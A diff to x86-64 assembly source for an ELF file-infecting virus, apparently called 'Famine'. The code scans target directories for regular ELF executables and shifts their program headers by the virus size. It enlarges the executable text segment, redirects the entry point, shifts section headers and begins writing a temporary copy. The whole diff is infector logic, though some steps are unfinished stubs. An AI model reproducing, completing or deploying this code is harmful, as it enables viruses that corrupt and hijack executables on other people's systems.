@@ -43,10 +43,10 @@ open_dir:
 find_file:
     cmp rbx, r8
     jge next_dir
-    lea rsi, [rsp + 256]                               ; struct
-    add rsi, rbx                                       ; current offset
+    lea rsi, [rsp + 256]                                ; struct
+    add rsi, rbx                                        ; current offset
     add rsi, LDIRENT_64.d_type
-    cmp byte [rsi], 0x8                                ; DT_REG
+    cmp byte [rsi], 0x8                                 ; DT_REG
     jne next_file
 
     lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]
@@ -82,14 +82,14 @@ target_file:
     repne scasb
     not rcx
     dec rcx
-    mov [rsp + rcx + 1], byte 0x0                       ; Work because we do not use dirent for now.
+    mov [rsp + rcx + 1], byte 0x0                           ; Work because we do not use dirent for now.
     dbgs [rel(hook.target)], [rsp]
 %endif
 
 validate_target:
-    lea rdi, [rsp]                                      ; filename
+    lea rdi, [rsp]                                          ; filename
     mov rax, SYS_OPEN
-    mov rsi, 0x0                                        ; O_RDONLY
+    mov rsi, 0x0                                            ; O_RDONLY
     syscall
     cmp al, 0
     jle next_file
@@ -102,7 +102,7 @@ validate_target:
     cmp rax, 0
     jne next_file
 %ifdef DEBUG
-    dbg [rel(hook.fz)], [rsp + FILE_SIZE + DIRENT + 48] ; st_size
+    dbg [rel(hook.fz)], [rsp + FILE_SIZE + DIRENT + 48]     ; st_size
 %endif
 
 map_target:
@@ -121,15 +121,15 @@ map_target:
 elf_header:
     mov rsi, [rbp - 16]
     cmp dword [rsi], 0x464c457f                             ; 7fELF
-    jne next_file
+    jne clear
     .exec:
         cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
-        je phdr
+        je elf_phdr
     .dyn:
         cmp word [rsi + Elf64_Ehdr.e_type], ET_DYN
-        je phdr
-    jmp next_file
-    ; mov ax, word [rsi + Elf64_Ehdr.e_type]               ; We need to check for ET_EXEC or ET_DYN
+        je elf_phdr
+    ; if (ehdr->e_machine != EM_X86_64)                     NEED TO ADD THIS PROBABLY.
+    jmp clear
 %ifdef DEBUG
     mov rsi, [rbp - 16]
     movzx rsi, word [rsi + Elf64_Ehdr.e_type] 
@@ -140,24 +140,87 @@ elf_header:
 %endif
 
 ; rsi = e_hdr
-phdr:
-    ; PAGE_ALIGN FAMINE_SIZE
+elf_phdr:
     mov rdx, rsi
-    add rdx, [rdx  + Elf64_Ehdr.e_phoff]    ; PHDR
-    ; mov [rdx + phdr64]
-    ; PAGE_ALIGN FAMINE_SIZE
-    ; add [rdx + phdr64.p_offset], rcx
-    ; add [rdx + 56 + phdr64.p_offset], rcx
-    ; mov rdi, [rsi + Elf64_Ehdr.e_phoff]
+    add rdx, [rdx  + Elf64_Ehdr.e_phoff]
+    ;rdx = phdr
+    PAGE_ALIGN FAMINE_SIZE
+    add [rdx + phdr64.p_offset], rcx                          ; phdr[0]
+    add [rdx + 0x38 + phdr64.p_offset], rcx                   ; phdr[1]
+    push rcx                                                  ; FAMINE_SIZE
+    ; this can maybe be optimized by jumping directly to phdr[2] after.
 %ifdef DEBUG
     push rdx
     dbg [rel(hook.number)], [rdx + phdr64.p_offset]
     pop rdx
     push rdx
-    dbg [rel(hook.number)], [rdx + 56 + phdr64.p_offset]
+    dbg [rel(hook.number)], [rdx + 0x38 + phdr64.p_offset]
     pop rdx
 %endif
 
+;rdx = phdr[0]
+patch_segtext:
+    pop rsi                                                 ; PAGE_ALIGN_UP(FAMINE_SIZE)
+    mov rax, [rbp - 16]
+    mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
+    xor rax, rax
+    .loop:
+        cmp cx, 0
+        je patch_hdr
+        sub cx, 1
+    .found:                                                 ; if TEXT_FOUND already
+        cmp al, 1
+        jne .compare
+        add [rdx + phdr64.p_offset], qword rsi
+    .compare:
+        cmp dword [rdx + phdr64.p_type], PT_LOAD
+        jne .keep
+        cmp dword [rdx + phdr64.p_flags], 0x5
+        jne .keep
+        sub [rdx + phdr64.p_vaddr], rsi
+        mov rdi, [rbp - 16]
+        mov r8, [rdx + phdr64.p_vaddr]
+        mov [rdi + Elf64_Ehdr.e_entry], r8
+        sub [rdx + phdr64.p_paddr], rsi
+        add [rdx + phdr64.p_filesz], rsi
+        add [rdx + phdr64.p_memsz], rsi
+        mov al, 1
+    .keep:
+        add rdx, 0x38                                       ; next phdr
+        jmp .loop
+
+patch_hdr:
+    test al, al
+    je clear                                               ; NEED TO JUMP TO MUMMAP.
+    add qword [rdi + Elf64_Ehdr.e_entry], 64
+
+patch_shdr:
+    mov rax, [rbp - 16]
+    add rax, [rax + Elf64_Ehdr.e_shoff]
+    xor rcx, rcx
+    mov cx, word [rax + Elf64_Ehdr.e_shnum]
+    .loop:
+        cmp cx, 0
+        je mimic
+        sub cx, 1
+        mov [rax + shdr64.sh_offset], rsi
+        add rax, 0x40
+        jmp .loop
+    mov rax, [rbp - 16]
+    add [rax + Elf64_Ehdr.e_shoff], rsi
+    add [rax + Elf64_Ehdr.e_phoff], rsi
+
+mimic:
+    lea rdi, [rel(hook.TMP)]
+    mov rsi, 577                                                   ; O_CREAT | O_WRONLY | O_TRUNC
+    mov rdx, [rsp + FILE_SIZE + DIRENT + MAPPED_FILE + 16]         ; st_mode mirror
+    mov rax, SYS_OPEN
+    syscall
+    cmp rax, 0
+    jl clear
+
+clear:
+    ; MUNMAP
 next_file:
     ; maybe RBX not valid anymore aswell.
     ; pop rbx
@@ -168,8 +231,8 @@ next_file:
     jmp find_file
 
 next_dir:
-    mov rcx, rbx                    ; maybe push RBX before
-    memset [rsp + 256], rcx         ; DIRENT_BUF memset
+    mov rcx, rbx                                            ; maybe push RBX before
+    memset [rsp + 256], rcx                                 ; dirent memset
     .next:
         cmp r14, 1
         jge target_dir.f2
@@ -186,6 +249,8 @@ hook:
         db FOLDER_1, 0
     .folder_2:
         db FOLDER_2, 0
+    .TMP:
+        db TMP, 0
 %ifdef DEBUG
     .newline:
         db 0xa, 0
